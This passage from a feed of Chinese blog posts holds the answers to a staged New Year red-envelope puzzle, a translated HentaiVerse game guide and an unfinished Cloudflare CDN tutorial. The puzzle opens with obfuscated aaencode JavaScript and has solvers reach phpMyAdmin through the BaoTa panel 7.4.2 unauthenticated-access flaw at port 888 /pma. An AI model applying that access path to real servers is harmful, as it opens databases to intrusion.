['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">[译] HentaiVerse 建议和指导</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"使用 Cloudflare 加速你的网站","date":"2020-12-15 08:19:29","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>CloudFlare 为我们提供了免费的 CDN 服务，并拥有全球各地的优秀节点，作为<strong>国外比较优秀</strong>的 CDN 服务商。</p>\n<p>但是，来自国内的访问都会被 CloudFlare 绕到大洋彼岸的美国。再加上某神秘的阻碍，导致在国内的访问一直不是很好。Ping 出延迟基本大于 &gt;= 200ms 。</p>\n<p>在一次偶然的机会中，发现：</p>\n<ul>\n<li>CloudFlare 拥有很多节点。</li>\n<li>CloudFlare 的节点之间速度非常之快。</li>\n<li>CloudFlare 的节点之间几乎没有延迟。</li>\n<li>CloudFlare 所有节点均免费，基本可以随便接入。</li>\n</ul>\n<hr>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%9E%E8%B7%B5\" class=\"headerlink\" title=\"实践\"></a>实践</h2>\n<p>既然发现了这个好办法，那么就开始实践吧！</p>\n<p>首先，前往「CloudFlare Partner」的站点登录。</p>\n<blockquote><p>这里要注意！CloudFlare 官方已经停止 CNAME 接入，只能前往「CloudFlare Partner」接入。</p></blockquote>\n<p>以 <a href=\"https://t.yfun.top/api/jump?u=https://cdn.moeelf.com/\">萌精灵 CDN</a> 为例，打开其官网：<a href=\"https://t.yfun.top/api/jump?u=https://cdn.moeelf.com/\">https://cdn.moeelf.com/</a> 并登录你的 CloudFlare 账号。</p>\n<p>然后点击页面右上角的「添加域名」并加你的域名接入 CloudFlare 。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/gh/MyBlog-GitHub/image-upload@main/uPic/hPX5DZ.png\"><p>输入域名并点击「添加」即可添加成功。</p>\n<p>接下来点击主页列表里的「管理 DNS」进入管理界面。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/gh/MyBlog-GitHub/image-upload@main/uPic/mLAxAy.png\"><p>接下来点击「添加新记录」添加一个新的记录。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/gh/MyBlog-GitHub/image-upload@main/uPic/UqyfQI.png\"><img webp-comp src=\"https://cdn.jsdelivr.net/gh/MyBlog-GitHub/image-upload@main/uPic/F0QTaI.png\"><p>然后进入你域名的 DNS 管理系统，注意是解析域名的地方。</p>\n<p>找到「CNAME 接入」处的对应 CNAME 地址，将其设为相应的解析地址。</p>\n<hr>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%8A%A0%E9%80%9F%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"加速访问\"></a>加速访问</h2>\n<p>虽然默认提供给我们的节点很慢，但我们可以从 CloudFlare 公开的节点中寻找访问速度快的节点。</p>\n<p>我找到了几个国内速度不错的节点，可以参考参考：</p>\n<table>\n<thead><tr>\n<th>IP 地址</th>\n<th>运营商</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>104.27.169.248</td>\n<td>默认</td>\n</tr>\n<tr>\n<td>104.19.19.119</td>\n<td>移动</td>\n</tr>\n<tr>\n<td>141.101.115.11</td>\n<td>移动</td>\n</tr>\n<tr>\n<td>104.16.245.1</td>\n<td>联通</td>\n</tr>\n<tr>\n<td>104.16.246.1</td>\n<td>联通</td>\n</tr>\n<tr>\n<td>104.20.157.19</td>\n<td>电信</td>\n</tr>\n<tr>\n<td>141.101.114.202</td>\n<td>电信</td>\n</tr>\n</tbody>\n</table>\n<p>然后再将原来的 CNAME 记录改为 A 记录到以上 IP，再配合智能运营商解析，达到提速。</p>\n<p>如果你不想一个一个设置，可以直接将「默认」记录指向 <code>cf.record.yfun.top</code> ，节点基本都是上面的，但偶尔会改变。</p>\n<p>可能会遇到的情况：<a href=\"https://blog.yfun.top/#%E6%97%A0%E6%B3%95%E6%AD%A3%E5%B8%B8%E7%AD%BE%E5%8F%91-SSL-%E8%AF%81%E4%B9%A6%EF%BC%9F\">无法正常签发 SSL 证书</a></p>\n<hr>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98\" class=\"headerlink\" title=\"常见问题\"></a>常见问题</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%97%A0%E6%B3%95%E6%AD%A3%E5%B8%B8%E7%AD%BE%E5%8F%91-SSL-%E8%AF%81%E4%B9%A6%EF%BC%9F\" class=\"headerlink\" title=\"无法正常签发 SSL 证书？\"></a>无法正常签发 SSL 证书？</h3>\n<p>CloudFlare 默认会提供免费 SSL 